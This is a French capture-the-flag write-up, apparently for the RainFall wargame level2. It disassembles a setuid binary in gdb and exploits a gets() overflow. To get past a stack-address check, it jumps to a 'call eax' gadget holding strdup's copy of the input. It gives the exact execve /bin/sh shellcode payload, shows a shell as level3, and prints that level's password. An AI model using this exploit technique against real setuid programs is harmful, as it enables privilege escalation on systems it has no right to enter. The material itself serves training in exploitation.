## Analyse

- `ls -la`
  ```
  [...]
    -rwsr-s---+ 1 level3 users  5403 Mar  6  2016 level2
  [...]
  ```
    - On a un binaire appartenant a level3 dans le home avec les droits SUID.

- `./level2`
  ```
    
  ```
  - Le programme attend un input
    - `test`
      - `test`
    - Le programme affiche le paramètre qu'on lui donne

- `gdb level2`
  - `set disassembly-flavor intel`
  - `info function`
    ```asm
    [...]
      0x080484b0  frame_dummy
      0x080484d4  p
      0x0804853f  main
    [...]
    ```
    - on trouve une fonction p et une fonction frame_dummy en plus du main
  - `disas main`
    ```asm
    Dump of assembler code for function main:
       0x0804853f <+0>:	push   ebp
       0x08048540 <+1>:	mov    ebp,esp
       0x08048542 <+3>:	and    esp,0xfffffff0
       0x08048545 <+6>:	call   0x80484d4 <p>
       0x0804854a <+11>:	leave
       0x0804854b <+12>:	ret
    End of assembler dump.
    ```
    - <+0> ... <+3>
      - Initialisation de la mémoire (aligne la stack)<br/><br/>
    - <+6>
      - Call p()<br/><br/>
    - <+11> ... <+12>
      - réinitialisation de la mémoire, fin d'exécution<br/><br/>
    - La fonction main() ne fait qu'appeler la fonction p()
    - frame_dummy() n'est pas appelée
- `disas p`
  ```asm
  Dump of assembler code for function p:
     0x080484d4 <+0>:	push   ebp
     0x080484d5 <+1>:	mov    ebp,esp
     0x080484d7 <+3>:	sub    esp,0x68
     0x080484da <+6>:	mov    eax,ds:0x8049860
     0x080484df <+11>:	mov    DWORD PTR [esp],eax
     0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
     0x080484e7 <+19>:	lea    eax,[ebp-0x4c]
     0x080484ea <+22>:	mov    DWORD PTR [esp],eax
     0x080484ed <+25>:	call   0x80483c0 <gets@plt>
     0x080484f2 <+30>:	mov    eax,DWORD PTR [ebp+0x4]
     0x080484f5 <+33>:	mov    DWORD PTR [ebp-0xc],eax
     0x080484f8 <+36>:	mov    eax,DWORD PTR [ebp-0xc]
     0x080484fb <+39>:	and    eax,0xb0000000
     0x08048500 <+44>:	cmp    eax,0xb0000000
     0x08048505 <+49>:	jne    0x8048527 <p+83>
     0x08048507 <+51>:	mov    eax,0x8048620
     0x0804850c <+56>:	mov    edx,DWORD PTR [ebp-0xc]
     0x0804850f <+59>:	mov    DWORD PTR [esp+0x4],edx
     0x08048513 <+63>:	mov    DWORD PTR [esp],eax
     0x08048516 <+66>:	call   0x80483a0 <printf@plt>
     0x0804851b <+71>:	mov    DWORD PTR [esp],0x1
     0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
     0x08048527 <+83>:	lea    eax,[ebp-0x4c]
     0x0804852a <+86>:	mov    DWORD PTR [esp],eax
     0x0804852d <+89>:	call   0x80483f0 <puts@plt>
     0x08048532 <+94>:	lea    eax,[ebp-0x4c]
     0x08048535 <+97>:	mov    DWORD PTR [esp],eax
     0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
     0x0804853d <+105>:	leave
     0x0804853e <+106>:	ret
  End of assembler dump.
  ```
  - <+0> ... <+3>
    - Initialisation de la mémoire (libère 104 octets pour la stack)<br/><br/>
  - <+6> ... <+14>
    - Stocke la valeur dans le registre data segment à l'adresse 0x80497c0 dans eax
      - `x/s 0x8049860`
        - `0x8049860 <stdout@@GLIBC_2.0>:	 ""`
    - Stocke la valeur de eax (stdout) dans la stack (à esp)
    - Call fflush() avec l'argument stocké dans la stack<br/><br/>
  - <+19> ... <+25>
    - Fait pointer eax sur ebp - 76
    - Stocke eax (l'adresse de ebp - 76) dans la stack (à esp)
    - Call gets() avec l'argument stocké dans la stack<br/><br/>
  - <+30> ... <+49>
    - Stocke l'adresse ebp + 4 (l'eip) dans eax
    - Stocke eax (l'adresse de l'eip) dans ebp - 12
    - Applique un filtre binaire (0xb0000000) à la valeur de eax
    - Compare la nouvelle valeur de eax avec 0xb0000000
    - Jump à <p +83> si la comparaison n'est pas vraie<br/><br/>
  - <+51> ... <+66>
    - Stocke la valeur à l'adresse 0x8048620 dans eax
      - `x/s 0x8048620`
        - `0x8048620:	 "(%p)\n"`
    - Stocke la valeur à ebp - 12 (l'adresse de l'eip) dans edx
    - Stocke la valeur de edx dans la stack (à esp + 4)
    - Stocke la valeur de eax ("(%p)\n") dans la stack (à esp)
    - Call printf() avec les arguments stockés dans la stack<br/><br/>
  - <+71> ... <+78>
    - Stocke 0x1 (1) dans la stack (à esp)
    - Call exit() avec l'argument stocké dans la stack<br/><br/>
  - <+83> ... <+89> (Jump conditionnel depuis <+49>)
    - Fait pointer eax sur ebp - 76 (le retour du gets)
    - Stocke eax (ebp - 76) dans la stack (à esp)
    - Call puts() avec l'argument stocké dans la stack<br/><br/>
  - <+94> ... <+100>
    - Fait pointer eax sur ebp - 76 (le retour du gets)
    - Stocke eax (ebp - 76) dans la stack (à esp)
    - Call strdup() avec l'argument stocké dans la stack<br/><br/>
  - <+105> ... <+106>
    - Réinitialisation de la mémoire, fin d'exécution<br/><br/>

La fonction p() fait donc:
  - fflush(stdout) => clean stdout
  - gets(ebp - 76) => attend un input
  - vérifie avec un filtre binaire et un cmp si l'eip commence par 0xb...
    - si c'est le cas:
      - printf("%p\n", eip) => affiche la valeur du pointeur sur eip
      - exit(1) => quitte la fonction
    - sinon:
      - puts(ebp - 76) => affiche le retour du gets
      - strdup(ebp - 76) => copie le retour du gets dans un malloc et le stocke dans eax

## Exploit

On sait qu'il y a un buffer overflow possible sur le gets, cependant le check au niveau de <p+44> nous empêche de réécrire l'EIP pour le faire pointer sur une fonction de la stack comme dans l'exercice précédent, il va falloir trouver un autre moyen de lancer notre exploit.

Après quelques recherches dans les fonctions importées par le programme, on trouve un call à eax dans frame_dummy:

- `gdb level2`
  - `disas frame_dummy`
    - ```asm
      [...]
        0x080484cf <+31>:	call   eax
      [...]
      ```
Puisque le strdup() stocke son output dans eax, en théorie on peut écrire un exploit dans l'input du gets() et utiliser l'adresse du call eax découvert dans frame_dummy (`0x080484cf`) pour réécrire l'EIP et faire exécuter notre exploit depuis eax !

On va se servir d'un [générateur de pattern](https://wiremask.eu/tools/buffer-overflow-pattern-generator/) pour trouver l'offset plus rapidement:

- `echo "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag" > /tmp/exploit`
- `gdb level2`
  - `run < /tmp/exploit`
  ```
  Program received signal SIGSEGV, Segmentation fault.
  0x37634136 in ?? ()
  ```
  - on rentre 0x37634136 dans le générateur de pattern et il nous donne un offset de 80.

Nous créons donc un payload à l'aide du shellcode trouvé dans le lien suivant : http://shell-storm.org/shellcode/files/shellcode-219.php

On a 80 octets avant d'écraser l'EIP, donc on écrit les 21 octets de notre shellcode, 59 octets random (80 - 21) et notre adresse en little endian:
  - `python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 59 + "\xcf\x84\x04\x08"' > /tmp/exploit`

Enfin nous lançons le programme avec le payload malicieux comme au level précédent:
  - `cat /tmp/exploit - | ./level2`
    ```
       j
    X�Rh//shh/bin��1�̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAτ
    
    ```
    - `whoami`
      ```
      level3
      ```
      - `cat /home/user/level3/.pass`
        ```
        492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
        ```
